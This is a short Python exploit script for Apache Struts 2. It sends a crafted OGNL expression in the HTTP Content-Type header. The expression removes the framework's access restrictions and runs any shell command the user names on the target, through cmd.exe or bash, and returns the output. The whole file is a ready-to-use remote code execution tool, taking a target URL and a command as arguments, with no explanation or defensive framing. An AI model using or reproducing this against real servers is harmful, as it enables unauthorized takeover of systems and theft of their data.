#!/usr/bin/python3

import requests
import argparse
import sys

def exploit(rhost, command):
	payload = "%{(#_='multipart/form-data')."
	payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
	payload += "(#_memberAccess?"
	payload += "(#_memberAccess=#dm):"
	payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
	payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
	payload += "(#ognlUtil.getExcludedPackageNames().clear())."
	payload += "(#ognlUtil.getExcludedClasses().clear())."
	payload += "(#context.setMemberAccess(#dm))))."
	payload += "(#cmd='" + command + "')."
	payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
	payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
	payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
	payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
	payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
	payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
	payload += "(#ros.flush())}"

	headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
	# proxies = {'http' : 'http://127.0.0.1:8080'}
	try:
		page = requests.get(rhost, headers = headers).text
	except:
		print('[+] Coudn\'t connect to the target. Exiting...')
		sys.exit()
	print(page.split('\n')[0])


if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument("-r", "--rhost", help = "Provide the target url", required = True)
	parser.add_argument("-c", "--command", help = "Provide the desired command to run on the vulnerable host", required = True)
	args = parser.parse_args()

	exploit(args.rhost, args.command)